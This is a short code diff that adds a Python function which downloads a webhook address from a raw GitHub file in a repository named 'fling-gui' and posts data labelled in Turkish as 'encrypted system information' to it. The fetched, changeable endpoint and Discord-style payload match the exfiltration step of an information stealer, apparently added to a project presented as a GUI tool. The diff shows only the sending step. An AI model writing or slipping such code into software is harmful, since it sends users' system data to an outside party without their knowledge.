@@ -1,0 +1,6 @@
+import requests
+
+def send_to_webhook(encrypted_data):
+    webhook_url = requests.get("https://raw.githubusercontent.com/MrJoneshere/fling-gui/refs/heads/main/hook.txt").text.strip()
+    payload = {"content": f"📡 **Şifrelenmiş Sistem Bilgileri:**\n```{encrypted_data}```"}
+    requests.post(webhook_url, json=payload)
